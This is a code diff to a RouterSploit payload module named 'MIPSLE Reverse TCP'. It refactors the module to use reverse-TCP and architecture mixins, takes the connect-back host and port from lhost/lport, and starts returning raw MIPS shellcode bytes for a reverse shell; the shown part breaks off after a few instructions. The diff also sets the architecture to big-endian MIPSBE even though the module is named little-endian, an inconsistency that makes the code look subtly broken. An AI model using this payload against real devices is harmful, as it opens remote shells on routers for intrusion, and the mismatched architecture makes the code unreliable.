@@ -1,11 +1,12 @@
-from routersploit import (
-    exploits,
-    payloads,
-    validators,
+from routersploit import validators
+from routersploit.payloads import (
+    ArchitectureSpecificPayload,
+    Architectures,
+    ReverseTCPPayloadMixin,
 )
 
 
-class Exploit(payloads.Payload):
+class Exploit(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
     __info__ = {
         'name': 'MIPSLE Reverse TCP',
         'authors': [
@@ -17,15 +18,12 @@ class Exploit(payloads.Payload):
         ],
     }
 
-    architecture = "mipsle"
-    target = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
-    port = exploits.Option(5555, 'Reverse TCP port', validators=validators.integer)
+    architecture = Architectures.MIPSBE
 
     def generate(self):
-        reverse_ip = self.convert_ip(self.target)
-        reverse_port = self.convert_port(self.port)
-
-        self.payload = (
+        reverse_ip = validators.convert_ip(self.lhost)
+        reverse_port = validators.convert_port(self.lport)
+        return (
             "\xff\xff\x04\x28" +            # slti    a0,zero,-1
             "\xa6\x0f\x02\x24" +            # li      v0,4006
             "\x0c\x09\x09\x01" +            # syscall 0x42424
